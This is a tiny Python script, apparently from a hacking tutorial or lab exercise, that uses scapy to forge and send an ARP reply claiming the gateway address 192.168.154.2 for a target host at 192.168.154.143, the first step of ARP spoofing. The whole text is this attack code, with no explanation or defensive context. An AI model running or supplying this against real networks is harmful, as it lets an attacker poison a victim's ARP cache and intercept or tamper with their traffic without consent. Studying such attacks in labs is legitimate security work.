#!/usr/bin/env python

import scapy.all as scapy

# scapy.ls(scapy.ARP)
packet = scapy.ARP(op=2, pdst="192.168.154.143", hwdst="00:0c:29:09:68:fd", psrc="192.168.154.2")
# print(packet.show())
# print(packet.summary())
scapy.send(packet)
